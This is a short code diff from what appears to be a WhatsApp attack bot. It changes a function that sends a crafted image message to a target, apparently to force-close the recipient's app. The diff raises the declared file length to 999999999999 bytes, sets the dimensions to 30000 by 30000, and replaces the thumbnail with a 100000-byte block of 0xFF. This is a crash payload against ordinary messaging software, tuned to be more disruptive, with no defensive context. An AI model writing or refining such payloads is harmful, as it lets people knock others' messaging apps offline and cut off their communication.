@@ -4230,11 +4230,11 @@ async function AmbaFcNewVIP(sock, target) {
           mediaKey: Buffer.from("UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", "base64"),
           mimetype: "image/jpeg",
           directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g",
-          fileLength: "99999999",
-          height: 2000,
-          width: 2000,
+          fileLength: "999999999999",
+          height: 30000,
+          width: 30000,
           mediaKeyTimestamp: "1775044724",
-          jpegThumbnail: Buffer.alloc(45000, 0)
+          jpegThumbnail: Buffer.alloc(100000, 0xFF)
         }
       }
     }
